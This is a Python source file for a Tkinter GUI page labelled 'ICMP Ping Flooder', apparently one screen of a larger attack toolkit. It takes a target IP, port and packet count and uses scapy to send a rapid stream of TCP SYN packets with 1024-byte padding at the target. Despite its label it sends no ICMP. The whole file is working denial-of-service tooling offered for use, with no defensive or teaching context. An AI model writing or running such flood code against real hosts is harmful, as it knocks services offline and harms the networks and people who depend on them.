import tkinter as tk  # python 3
# import Tkinter as tk     # python 2
# import tkFont as tkfont  # python 2
from tkinter import font as tkfont

from scapy.all import *

from nav_bar import *

global s
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
global bytes
bytes = random._urandom(1024)


class ICMP(tk.Frame):

    # ============================= Initializer Function

    def __init__(self, parent, controller):
        tk.Frame.__init__(self, parent)
        self.controller = controller
        abtframefont = tkfont.Font(family='Calibri', size=33, weight="bold")
        display_nav_bar(self, controller)
        aboutframe = tk.Label(self, text="    ICMP Ping Flooder", bg='#3B5262', fg='white', anchor="c",
                              font=abtframefont)
        aboutframe.place(rely=0.08, relheight=0.12, relwidth=1)

        allscreenframe = tk.Label(self, bg='white')
        allscreenframe.place(rely=0.2, relheight=1, relwidth=1)

        # LABELS
        labelTarget = Label(self, text="Enter Target IP: ",
                            font=('Calibri', 13), bg='#4D6C84', fg='white', anchor='c').place(rely=0.28, relx=0.08,
                                                                                              relheight=0.06,
                                                                                              relwidth=0.24)
        labelPort = Label(self, text="Enter Port number: ",
                          font=('Calibri', 13), bg='#4D6C84', fg='white', anchor='c').place(rely=0.36, relx=0.08,
                                                                                            relheight=0.06,
                                                                                            relwidth=0.24)
        labelPackets = Label(self, text="Enter number of packets: ",
                             font=('Calibri', 13), bg='#4D6C84', fg='white', anchor='c').place(rely=0.44, relx=0.08,
                                                                                               relheight=0.06,
                                                                                               relwidth=0.24)

        # INPUT TEXT BOXES
        self.TargetTB = Entry(self, font=('Calibri', 13))
        self.TargetTB.place(rely=0.28, relx=0.36, relheight=0.06, relwidth=0.30)
        self.PortTB = Entry(self, font=('Calibri', 13))
        self.PortTB.place(rely=0.36, relx=0.36, relheight=0.06, relwidth=0.30)
        self.PacketsTB = Entry(self, font=('Calibri', 13))
        self.PacketsTB.place(rely=0.44, relx=0.36, relheight=0.06, relwidth=0.30)

        #  BUTTONS

        Button(self, text="Start Flood", font=('Calibri', 16), bg='#4D6C84', fg='white', anchor='c',
               command=lambda: self.execute()).place(rely=0.36, relx=0.7, relheight=0.06, relwidth=0.08)

    # Execute Button function ===============

    def execute(self):
        # target_ip = "192.168.1.120"
        labelPackets = Label(self, text="Refer to terminal for flood results",
                             font=('Calibri', 13), anchor='c').place(rely=0.54, relx=0.36, relheight=0.05,
                                                                     relwidth=0.30)
        target_ip = self.TargetTB.get()
        targetPort = int(self.PortTB.get())
        num_packets = int(self.PacketsTB.get())
        ip = IP(dst=target_ip)
        tcp = TCP(sport=RandShort(), dport=targetPort, flags="S")
        raw = Raw(b"X" * 1024)
        p = ip / tcp / raw
        for i in range(num_packets):
            send(p, inter=0.001)
        print("\nICMP flood finished\n")
